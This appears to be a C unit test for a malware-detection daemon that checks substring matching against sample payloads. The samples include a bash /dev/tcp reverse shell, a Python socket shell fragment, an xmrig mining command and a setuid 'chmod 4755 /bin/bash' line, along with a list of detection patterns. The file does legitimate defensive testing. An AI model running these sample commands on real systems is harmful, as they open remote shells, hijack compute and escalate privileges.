/*
 * tests/security/guardian_detection_test.c — YARA scan-buffer match test
 * Tests the YARA detection path without running the guardian daemon.
 * 8 assertions.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static int test_count = 0;
static int pass_count = 0;

#define ASSERT(cond) do { \
    test_count++; \
    if (cond) { pass_count++; printf("  [PASS] %s\n", #cond); } \
    else { printf("  [FAIL] %s\n", #cond); } \
} while(0)

/* Mock YARA rule matching — simulates what sig_engine does */
static int mock_yara_match(const char *rule_name, const char *pattern, const char *buffer, size_t len) {
    return strstr(buffer, pattern) != NULL ? 1 : 0;
}

static const char *RULES[] = {
    "Reverse_Shell_Bash_DevTcp", "/dev/tcp/",
    "Reverse_Shell_Python", "import socket",
    "CryptoMiner", "stratum+tcp://",
    "PrivilegeEscalation", "chmod 4755",
    NULL
};

int main(void) {
    printf("=== Guardian Detection Test ===\n");

    /* Test 1: Detect reverse shell pattern */
    printf("Test 1: Reverse shell detection\n");
    {
        const char *malware = "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";
        int rc = mock_yara_match("Reverse_Shell_Bash_DevTcp", "/dev/tcp/", malware, strlen(malware));
        ASSERT(rc == 1);
    }

    /* Test 2: Detect Python reverse shell */
    printf("Test 2: Python reverse shell detection\n");
    {
        const char *malware = "python -c 'import socket;s=socket.socket()'";
        int rc = mock_yara_match("Reverse_Shell_Python", "import socket", malware, strlen(malware));
        ASSERT(rc == 1);
    }

    /* Test 3: Detect crypto miner */
    printf("Test 3: Crypto miner detection\n");
    {
        const char *malware = "xmrig --url stratum+tcp://pool.minexmr.com:4444";
        int rc = mock_yara_match("CryptoMiner", "stratum+tcp://", malware, strlen(malware));
        ASSERT(rc == 1);
    }

    /* Test 4: Detect privilege escalation */
    printf("Test 4: Privilege escalation detection\n");
    {
        const char *malware = "chmod 4755 /bin/bash";
        int rc = mock_yara_match("PrivilegeEscalation", "chmod 4755", malware, strlen(malware));
        ASSERT(rc == 1);
    }

    /* Test 5: Clean file — no match */
    printf("Test 5: Clean file (no match)\n");
    {
        const char *clean = "Hello World, this is a normal file.";
        int rc = mock_yara_match("Reverse_Shell_Bash_DevTcp", "/dev/tcp/", clean, strlen(clean));
        ASSERT(rc == 0);
    }

    /* Test 6: Empty buffer — no match */
    printf("Test 6: Empty buffer\n");
    {
        int rc = mock_yara_match("CryptoMiner", "stratum+tcp://", "", 0);
        ASSERT(rc == 0);
    }

    /* Test 7: Partial match — no match (substring must be complete) */
    printf("Test 7: Partial pattern\n");
    {
        const char *partial = "stratum+tcp";
        int rc = mock_yara_match("CryptoMiner", "stratum+tcp://", partial, strlen(partial));
        ASSERT(rc == 0);
    }

    /* Test 8: Multiple rules checked */
    printf("Test 8: Multiple rules\n");
    {
        const char *malware = "chmod 4755 /bin/sh; bash -i >& /dev/tcp/1.2.3.4/4444";
        int matches = 0;
        for (int i = 0; RULES[i] != NULL; i += 2) {
            if (mock_yara_match(RULES[i], RULES[i+1], malware, strlen(malware)))
                matches++;
        }
        ASSERT(matches >= 2);
    }

    printf("\n=== Results: %d/%d passed (%d assertions) ===\n",
           pass_count, test_count, test_count);
    return (pass_count == test_count) ? 0 : 1;
}
